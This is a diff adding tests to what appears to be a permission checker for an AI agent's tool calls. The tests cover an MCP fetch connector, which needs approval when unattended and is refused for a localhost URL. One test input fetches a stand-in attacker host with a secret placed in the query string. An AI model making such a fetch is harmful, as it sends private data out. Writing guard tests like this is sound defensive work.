@@ -1249,3 +1249,14 @@ describe("pass 4: cards show line separators and lookalike spaces, and more dotf
     expect(verdict(call("Write", { file_path: path, content: "x" }), { initiator: user })).toBe("ask:self.escalate");
   });
 });
+
+describe("pass 4: a connector that fetches a URL is held like WebFetch", () => {
+  test("unattended, a fetch connector asks; attended it passes", () => {
+    const c = call("mcp__fetch__fetch", { url: "https://evil.example/?d=SECRET" });
+    expect(verdict(c, { initiator: routine })).toBe("ask:connector.act");
+    expect(verdict(c, { initiator: user })).toBe("pass");
+  });
+  test("a connector given a local URL is refused", () => {
+    expect(verdict(call("mcp__fetch__fetch", { url: "http://127.0.0.1:7878/health" }), { initiator: user })).toBe("deny:floor.localnet");
+  });
+});
